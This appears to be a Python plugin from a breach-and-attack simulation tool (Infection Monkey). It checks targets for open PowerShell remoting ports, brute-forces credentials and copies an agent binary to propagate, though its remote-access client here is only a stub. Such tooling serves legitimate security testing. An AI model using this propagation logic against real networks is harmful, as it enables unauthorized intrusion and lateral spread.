import logging
from functools import partial
from pprint import pformat
from typing import Any, Dict, Sequence

# common imports
from common.event_queue import IAgentEventPublisher
from common.types import AgentID, Event, NetworkPort, PortStatus
from common.utils.code_utils import del_key
from common.utils.environment import is_windows_os

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository, IAgentOTPProvider
from infection_monkey.exploit.tools import BruteForceCredentialsProvider, BruteForceExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository

from .credentials_generator import generate_powershell_credentials
from .powershell_command_builder import build_powershell_command
from .powershell_options import PowerShellOptions

logger = logging.getLogger(__name__)


POWERSHELL_NO_SSL_PORT = NetworkPort(5985)
POWERSHELL_SSL_PORT = NetworkPort(5986)


def should_attempt_exploit(host: TargetHost) -> bool:
    # attempt exploit if any PowerShell remoting port is open or if its status is unknown
    return (
        (POWERSHELL_NO_SSL_PORT not in host.ports_status.tcp_ports)
        or _http_powershell_port_is_open(host)
    ) or (
        (POWERSHELL_SSL_PORT not in host.ports_status.tcp_ports)
        or _https_powershell_port_is_open(host)
    )


def _http_powershell_port_is_open(host: TargetHost) -> bool:
    return (
        POWERSHELL_NO_SSL_PORT in host.ports_status.tcp_ports
        and host.ports_status.tcp_ports[POWERSHELL_NO_SSL_PORT].status == PortStatus.OPEN
    )


def _https_powershell_port_is_open(host: TargetHost) -> bool:
    return (
        POWERSHELL_SSL_PORT in host.ports_status.tcp_ports
        and host.ports_status.tcp_ports[POWERSHELL_SSL_PORT].status == PortStatus.OPEN
    )


class StubPowerShellRemoteAccessClientFactory:
    def __init__(*args, **kwargs):
        pass


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        otp_provider: IAgentOTPProvider,
        **kwargs,
    ):
        self._plugin_name = plugin_name
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        credentials_generator = partial(
            generate_powershell_credentials,
            running_from_windows=is_windows_os(),
        )
        self._credentials_provider = BruteForceCredentialsProvider(
            propagation_credentials_repository, credentials_generator
        )
        self._otp_provider = otp_provider

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResultData:
        # HTTP ports options are hack because they are needed in fingerprinters
        del_key(options, "http_ports")

        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            powershell_options = PowerShellOptions(**options)
        except Exception as err:
            msg = f"Failed to parse PowerShell options: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        if not should_attempt_exploit(host):
            msg = f"Host {host.ip} has no open PowerShell remoting ports"
            logger.debug(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        command_builder = partial(
            build_powershell_command,
            self._agent_id,
            servers,
            current_depth,
            remote_agent_binary_destination_path=get_agent_dst_path(host),
            otp_provider=self._otp_provider,
        )
        powershell_exploit_client_factory = StubPowerShellRemoteAccessClientFactory(
            host, powershell_options, command_builder
        )

        brute_force_exploiter = BruteForceExploiter(
            self._plugin_name,
            self._agent_id,
            get_agent_dst_path(host),
            powershell_exploit_client_factory,
            self._credentials_provider,
            self._agent_binary_repository,
            self._agent_event_publisher,
            {"powershell-exploiter"},
        )

        try:
            logger.debug(f"Running PowerShell exploiter on host {host.ip}")
            return brute_force_exploiter.exploit_host(host, interrupt)
        except Exception as err:
            msg = f"An unexpected exception occurred while attempting to exploit host: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
